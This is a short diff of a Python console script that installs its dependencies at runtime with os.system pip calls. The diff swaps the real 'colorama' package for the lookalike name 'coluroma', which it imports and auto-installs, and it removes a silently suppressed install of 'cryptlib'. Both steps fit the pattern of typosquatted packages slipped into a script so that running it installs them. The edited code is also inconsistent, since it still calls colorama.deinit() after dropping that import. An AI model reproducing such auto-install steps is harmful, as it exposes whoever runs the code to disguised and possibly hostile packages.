@@ -14,15 +14,11 @@ except:
     os.system("pip install tqdm")
     from tqdm import tqdm
 try:
-    import colorama
+    import coluroma
 except ImportError:
-    os.system("pip install colorama")
-    import colorama
-try:
-    from cryptlib import encstr
-except ImportError:
-    os.system("pip install cryptlib -q -q -q")
-    from cryptlib import encstr
+    os.system("pip install coluroma")
+    from coluroma import colors
+
 colorama.deinit()
 banner = Center.XCenter("""
     ____       _____    _   _        ___  _     _____           ____     _____
